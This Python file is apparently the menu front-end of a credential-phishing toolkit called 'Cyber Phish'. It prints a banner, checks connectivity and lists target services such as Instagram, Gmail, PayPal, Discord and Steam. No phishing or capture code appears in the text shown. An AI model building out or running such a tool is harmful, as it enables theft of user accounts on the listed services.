import os
import random
from rgbprint import gradient_print

try:
    from colorama import Fore, Style
except ModuleNotFoundError:
    os.system("pip install colorama")

from urllib.request import urlopen
from Core.helper.color import green, white, blue, red, start, alert , yellow , purple

green = yellow
red = purple
white = purple

Version = "2.2"
yellow = ("\033[1;33;40m")

banner = f"""
	   ______      __                 ____  __    _      __  
	  / ____/_  __/ /_  ___  _____   / __ \/ /_  (_)____/ /_ 
	 / /   / / / / __ \/ _ \/ ___/  / /_/ / __ \/ / ___/ __ \\
	/ /___/ /_/ / /_/ /  __/ /     / ____/ / / / (__  ) / / /
	\____/\__, /_.___/\___/_/     /_/   /_/ /_/_/____/_/ /_/ 
		 /____/      \n
			</> Author: Saad Khan | Cyber Dioxide

	===========================================================
			Telegram @cyberoxide
	===========================================================
"""


def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False


all_col = [Style.BRIGHT + Fore.RED, Style.BRIGHT + Fore.CYAN, Style.BRIGHT + Fore.LIGHTCYAN_EX,
           Style.BRIGHT + Fore.LIGHTBLUE_EX, Style.BRIGHT + Fore.LIGHTCYAN_EX, Style.BRIGHT + Fore.LIGHTMAGENTA_EX,
           Style.BRIGHT + Fore.LIGHTYELLOW_EX]

ran = random.choice(all_col)


def menu():

    gradient_print(banner, start_color='yellow' , end_color='magenta')
    print(alert + " More Versions Will Come Soon Stay Updated, Follow My Github\n")
    print(white + "options:")
    print(
        green + "[" + white + "1" + green + "]" + white + " Instagram" + green + "			[" + white + "12" + green + "]" + white + " Paypal")
    print(
        green + "[" + white + "2" + green + "]" + white + " Facebook" + green + "			[" + white + "13" + green + "]" + white + " Discord")
    print(
        green + "[" + white + "3" + green + "]" + white + " Gmail" + green + "			[" + white + "14" + green + "]" + white + " Spotify")
    print(
        green + "[" + white + "4" + green + "]" + white + " Gmail (simple)" + green + "		[" + white + "15" + green + "]" + white + " Blockchain")
    print(
        green + "[" + white + "5" + green + "]" + white + " Twitter" + green + "			[" + white + "16" + green + "]" + white + " RiotGames")
    print(
        green + "[" + white + "6" + green + "]" + white + " Snapchat" + green + "			[" + white + "17" + green + "]" + white + " Rockstar")
    print(
        green + "[" + white + "7" + green + "]" + white + " Snapchat (simple)" + green + "		[" + white + "18" + green + "]" + white + " AskFM")
    print(
        green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "19" + green + "]" + white + " 000Webhost")
    print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green)
    print(
        green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "21" + green + "]" + white + " Gamehag")
    print(
        green + "[" + white + "11" + green + "]" + white + " Playstation" + green + "	        [" + white + "22" + green + "]" + white + " Mega")
    print(green + "-----------------------------------------------------------------------")
    print(green + "[" + white + "00" + green + "]" + red + " EXIT")


def Welcome():
    os.system("clear")

menu()
